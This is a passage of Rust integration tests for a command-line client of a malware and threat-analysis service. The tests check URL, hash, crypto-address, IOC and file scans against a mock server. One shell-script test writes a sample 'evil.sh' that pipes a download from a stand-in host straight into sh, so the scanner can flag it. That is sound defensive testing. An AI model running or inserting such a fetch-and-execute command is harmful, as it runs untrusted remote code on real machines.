    assert!(!path.contains("resolve"), "path: {path}");
    assert!(stdout(&out).contains("Punycode host"), "stdout: {}", stdout(&out));
}

#[test]
fn url_analysis_forwards_the_resolve_opt_in() {
    let server = TestServer::start(|_| json(r#"{"url":"https://a.test","host":"a.test"}"#));
    let home = TempHome::new(&server.url);

    mlab(&home, &["scan", "url", "https://a.test", "--resolve"]);

    assert!(server.requests()[0].path.contains("resolve=1"));
}

#[test]
fn each_lookup_uses_the_parameter_name_its_endpoint_expects() {
    // These four differ (`email`, `number`, `mac`, `hash`); getting one wrong is
    // a 400 the user cannot explain.
    for (args, expected) in [
        (vec!["scan", "email", "a@b.test"], "/api/v1/scan/email?email=a%40b.test"),
        (vec!["scan", "phone", "+33612345678"], "/api/v1/scan/phone?number=%2B33612345678"),
        (vec!["scan", "mac", "00:11:22:33:44:55"], "/api/v1/scan/mac?mac=00%3A11%3A22%3A33%3A44%3A55"),
        (vec!["scan", "hash", "d41d8cd98f00b204e9800998ecf8427e"], "/api/v1/scan/hash?hash=d41d8cd98f00b204e9800998ecf8427e"),
    ] {
        let server = TestServer::start(|_| json(r#"{"verdict":"clean"}"#));
        let home = TempHome::new(&server.url);

        let out = mlab(&home, &args);

        assert!(out.status.success(), "{args:?} → {}", stderr(&out));
        assert_eq!(server.requests()[0].path, expected, "for {args:?}");
    }
}

#[test]
fn several_hashes_switch_to_the_bulk_endpoint() {
    let server = TestServer::start(|_| json(r#"{"count":2,"results":[],"invalid":[]}"#));
    let home = TempHome::new(&server.url);

    let out = mlab(&home, &["scan", "hash", "aaa", "bbb"]);

    assert!(out.status.success(), "stderr: {}", stderr(&out));
    let request = &server.requests()[0];
    assert_eq!(request.route(), "POST /api/v1/scan/hash");
    let body: serde_json::Value = serde_json::from_str(&request.body).expect("json body");
    assert_eq!(body["hashes"], serde_json::json!(["aaa", "bbb"]));
}

#[test]
fn several_addresses_switch_to_the_bulk_crypto_endpoint() {
    let server = TestServer::start(|_| json(r#"{"count":2,"results":[],"invalid":[]}"#));
    let home = TempHome::new(&server.url);

    let out = mlab(&home, &["scan", "crypto", "addr1", "addr2", "--chain", "eth"]);

    assert!(out.status.success(), "stderr: {}", stderr(&out));
    let request = &server.requests()[0];
    assert_eq!(request.route(), "POST /api/v1/scan/crypto");
    let body: serde_json::Value = serde_json::from_str(&request.body).expect("json body");
    assert_eq!(body["addresses"], serde_json::json!(["addr1", "addr2"]));
    assert_eq!(body["chain"], "eth");
}

#[test]
fn a_single_address_still_uses_the_cheap_get() {
    let server = TestServer::start(|_| json(CRYPTO_BTC));
    let home = TempHome::new(&server.url);

    mlab(&home, &["scan", "crypto", BTC_ADDRESS]);

    assert_eq!(server.requests()[0].method, "GET");
}

#[test]
fn a_bulk_answer_shows_the_rows_the_api_could_not_use() {
    // Dropping the rejected rows would silently lose half of what was pasted.
    let server = TestServer::start(|_| {
        json(r#"{"count":1,"results":[{"hash":"aaa","verdict":"clean"}],
                 "invalid":["not-a-hash"],"not_queryable":[{"hash":"bbb"}]}"#)
    });
    let home = TempHome::new(&server.url);

    let out = mlab(&home, &["scan", "hash", "aaa", "not-a-hash", "bbb"]);

    let rendered = stdout(&out);
    assert!(rendered.contains("not-a-hash"), "stdout: {rendered}");
    assert!(rendered.contains("Not queryable"), "stdout: {rendered}");
}

// ── IOC extraction ────────────────────────────────────────────────────────

#[test]
fn ioc_extraction_reads_a_pipe() {
    let server = TestServer::start(|_| {
        json(r#"{"status":"ok","ioc_total":2,"truncated":false,
                 "iocs":{"ipv4":[{"value":"8.8.8.8","link":"/ip/8.8.8.8"}],
                         "domain":[{"value":"evil.test","link":"/domain/evil.test"}]}}"#)
    });
    let home = TempHome::new(&server.url);

    let out = mlab_stdin(&home, &["ioc"], "contact 8.8.8.8 or evil.test for details");

    assert!(out.status.success(), "stderr: {}", stderr(&out));
    let request = &server.requests()[0];
    assert_eq!(request.route(), "POST /api/v1/scan/ioc");
    let body: serde_json::Value = serde_json::from_str(&request.body).expect("json body");
    assert!(body["text"].as_str().unwrap().contains("8.8.8.8"));
    assert!(stdout(&out).contains("evil.test"), "stdout: {}", stdout(&out));
}

#[test]
fn ioc_extraction_reads_a_file_and_forwards_its_options() {
    let server = TestServer::start(|_| json(r#"{"status":"ok","ioc_total":0,"iocs":{}}"#));
    let home = TempHome::new(&server.url);
    let report = home.path.join("report.txt");
    std::fs::write(&report, "see 1.2.3.4").unwrap();

    let out = mlab(
        &home,
        &["ioc", report.to_str().unwrap(), "--country", "fr", "--risk", "deep"],
    );

    assert!(out.status.success(), "stderr: {}", stderr(&out));
    let path = &server.requests()[0].path;
    assert!(path.contains("country=fr"), "path: {path}");
    assert!(path.contains("risk=deep"), "path: {path}");
}

#[test]
fn empty_input_is_refused_before_the_call() {
    let server = TestServer::start(|_| json("{}"));
    let home = TempHome::new(&server.url);

    let out = mlab_stdin(&home, &["ioc"], "   \n");

    assert_eq!(out.status.code(), Some(EXIT_INPUT));
    assert!(server.requests().is_empty(), "nothing should be sent");
}

// ── Shell script analysis ─────────────────────────────────────────────────

#[test]
fn a_script_is_uploaded_as_base64_then_read_back() {
    let server = TestServer::start(|req| match (req.method.as_str(), req.route_path()) {
        ("POST", "/api/v1/scan/file/bash") => json(r#"{"status":"ok","sha256":"abc123"}"#),
        ("GET", "/api/v1/scan/file/bash") => json(
            r#"{"status":"ok","file":{"filename":"evil.sh","sha256":"abc123","size":24,"lines":2},
                "iocs":{"url":[{"value":"http://evil.test/x"}]},"ioc_total":1,"truncated":false,
                "suspicious":[{"severity":"high","title":"curl piped to shell"}]}"#,
        ),
        _ => not_found(),
    });
    let home = TempHome::new(&server.url);
    let script = home.path.join("evil.sh");
    std::fs::write(&script, "curl http://evil.test/x | sh\n").unwrap();

    let out = mlab(&home, &["scan", "bash", script.to_str().unwrap()]);

    assert!(out.status.success(), "stderr: {}", stderr(&out));
    let posted: serde_json::Value = serde_json::from_str(&server.requests()[0].body).expect("json");
    assert_eq!(
        posted["content_b64"],
        "Y3VybCBodHRwOi8vZXZpbC50ZXN0L3ggfCBzaAo="
    );
    assert_eq!(posted["filename"], "evil.sh");
    assert!(server.requests()[1].path.contains("sha256=abc123"));

    let rendered = stdout(&out);
    assert!(rendered.contains("curl piped to shell"), "stdout: {rendered}");
    assert!(rendered.contains("http://evil.test/x"), "stdout: {rendered}");
}

// ── Network capture ───────────────────────────────────────────────────────

#[test]
fn a_network_capture_is_rendered_as_a_table() {
    let server = TestServer::start(|_| {
        json(r#"{"count":2,"totalBytes":4096,"captureMs":812,"requests":[
                 {"method":"GET","status":200,"resourceType":"document","url":"https://a.test/",
                  "mimeType":"text/html","encodedBytes":2048,"failed":false},
                 {"method":"GET","status":404,"resourceType":"script","url":"https://a.test/x.js",
                  "encodedBytes":0,"failed":true,"errorText":"net::ERR_ABORTED"}]}"#)
    });
    let home = TempHome::new(&server.url);

    let out = mlab(&home, &["network", "https://a.test"]);

    assert!(out.status.success(), "stderr: {}", stderr(&out));
    assert_eq!(server.requests()[0].route_path(), "/api/v1/scan/domain/loadnetworkrequest");
    let rendered = stdout(&out);
    assert!(rendered.contains("https://a.test/x.js"), "stdout: {rendered}");
    assert!(rendered.contains("ERR_ABORTED"), "stdout: {rendered}");
    assert!(rendered.contains("404"), "stdout: {rendered}");
}

// ── File results, both payload shapes ─────────────────────────────────────

const FILE_RESULTS_CURRENT: &str = r#"{
  "status":"completed",
  "file":{"sha256":"abc","display_name":"sample.exe","md5":"d4","sha1":"a1","ssdeep":"3:tk:tk",
          "size":70,"mime_type":"application/x-dosexec"},
  "scanner":"static","tools_total":2,"tools_done":2,
  "tools":[{"tool":"exiftool","scanner":"static","status":"completed","exit_code":0,
            "duration_ms":120,"output_bytes":512,"note":"","ran_at":"2026-07-05T16:14:04+00:00"}],
  "observations":{"url":[{"value":"http://evil.test","tool":"strings","context":""}]},
  "sightings":[{"kind":"filename","value":"invoice.exe","first_seen":"2026-07-01T00:00:00+00:00"}]}"#;

#[test]
fn file_results_render_the_shape_production_returns_today() {
    let server = TestServer::start(|_| json(FILE_RESULTS_CURRENT));
    let home = TempHome::new(&server.url);

    let out = mlab(&home, &["results", "file", "abc"]);

    assert!(out.status.success(), "stderr: {}", stderr(&out));
    let rendered = stdout(&out);
    assert!(rendered.contains("sample.exe"), "stdout: {rendered}");
    assert!(rendered.contains("exiftool"), "stdout: {rendered}");
    assert!(rendered.contains("http://evil.test"), "stdout: {rendered}");
    assert!(rendered.contains("invoice.exe"), "stdout: {rendered}");
}

#[test]
fn file_results_still_render_the_older_payload() {
    // The published OpenAPI example still describes this one, so a deployment
    // running the previous shape must not break the command.
    let server = TestServer::start(|_| {
        json(
            r#"{"status":"completed","jobs_total":1,"jobs_completed":1,
                "file":{"sha256":"abc","md5":"d4","filename":"x.png","size":70,
                        "mime_type":"image/png","created_at":"2026-07-05T16:13:54Z"},
                "analysis":[{"job_name":"exiftool","end_date":"2026-07-05T16:14:04+00:00","data":"File Type : PNG"}]}"#,
        )
    });
    let home = TempHome::new(&server.url);

    let out = mlab(&home, &["results", "file", "abc"]);

    assert!(out.status.success(), "stderr: {}", stderr(&out));
    assert!(stdout(&out).contains("EXIFTOOL"), "stdout: {}", stdout(&out));
}

#[test]
fn a_failed_file_scan_explains_itself() {
    let server = TestServer::start(|_| {
        json(
            r#"{"status":"failed","error":{"kind":"scan_failed","message":"The scan could not be completed.",
                "reason":"router rejected the sample"},"file":{"sha256":"abc"},
                "tools_total":0,"tools_done":0,"tools":[],"observations":{},"sightings":[]}"#,
        )
    });
    let home = TempHome::new(&server.url);

    let out = mlab(&home, &["results", "file", "abc"]);

    let rendered = stdout(&out);
    assert!(rendered.contains("router rejected the sample"), "stdout: {rendered}");
}

#[test]
fn one_tools_raw_output_can_be_fetched_on_demand() {
    let server = TestServer::start(|_| {
        json(r#"{"sha256":"abc","tool":"strings","is_json":false,"output":"IHDR\nIDAT"}"#)
    });
    let home = TempHome::new(&server.url);

    let out = mlab(&home, &["results", "file", "abc", "--tool", "strings"]);

    assert!(out.status.success(), "stderr: {}", stderr(&out));
    assert_eq!(server.requests()[0].route_path(), "/api/v1/scan/file/output");
    assert!(server.requests()[0].path.contains("tool=strings"));
    assert_eq!(stdout(&out).trim(), "IHDR\nIDAT");
}

#[test]
fn a_json_tool_output_is_pretty_printed() {
    let server = TestServer::start(|_| {
        json(r#"{"sha256":"abc","tool":"exif","is_json":true,"output":"{\"MIMEType\":\"image/png\"}"}"#)
    });
    let home = TempHome::new(&server.url);

    let out = mlab(&home, &["results", "file", "abc", "--tool", "exif"]);

    assert!(stdout(&out).contains("\"MIMEType\": \"image/png\""), "stdout: {}", stdout(&out));
}

// ── Following a file scan ─────────────────────────────────────────────────

#[test]
fn scan_file_follow_waits_for_the_analysis_then_prints_it() {
    use std::sync::atomic::{AtomicUsize, Ordering};
    use std::sync::Arc;

    let polls = Arc::new(AtomicUsize::new(0));
    let seen = Arc::clone(&polls);
    let server = TestServer::start(move |req| match (req.method.as_str(), req.route_path()) {
        ("POST", "/upload/file") => json(r#"{"success":true,"sha256":"abc","job_launched":true}"#),
        ("GET", "/api/v1/scan/file/results") => {
            if seen.fetch_add(1, Ordering::SeqCst) == 0 {
                json(r#"{"status":"running","file":{"sha256":"abc"},"tools_total":2,"tools_done":1,"tools":[]}"#)
            } else {
                json(FILE_RESULTS_CURRENT)
            }
        }
        _ => not_found(),
    });
    let home = TempHome::new(&server.url);
    let sample = home.path.join("sample.bin");
    std::fs::write(&sample, b"hello").unwrap();

    let out = mlab(&home, &["scan", "file", sample.to_str().unwrap(), "--follow"]);

    assert!(out.status.success(), "stderr: {}", stderr(&out));
    assert!(polls.load(Ordering::SeqCst) >= 2, "it should have waited");
    assert!(stdout(&out).contains("sample.exe"), "stdout: {}", stdout(&out));
}

#[test]
fn scan_file_follow_stops_on_a_failed_analysis() {
    let server = TestServer::start(|req| match (req.method.as_str(), req.route_path()) {
        ("POST", "/upload/file") => json(r#"{"success":true,"sha256":"abc"}"#),
        ("GET", "/api/v1/scan/file/results") => json(
            r#"{"status":"failed","error":{"message":"The scan could not be completed.","reason":"boom"},
                "file":{"sha256":"abc"},"tools_total":0,"tools_done":0,"tools":[]}"#,
        ),
        _ => not_found(),
    });
    let home = TempHome::new(&server.url);
    let sample = home.path.join("sample.bin");
    std::fs::write(&sample, b"hello").unwrap();

    let out = mlab(&home, &["scan", "file", sample.to_str().unwrap(), "--follow"]);

    // Terminal, so it must stop rather than poll until the timeout.
    assert!(stdout(&out).contains("boom"), "stdout: {}", stdout(&out));
}
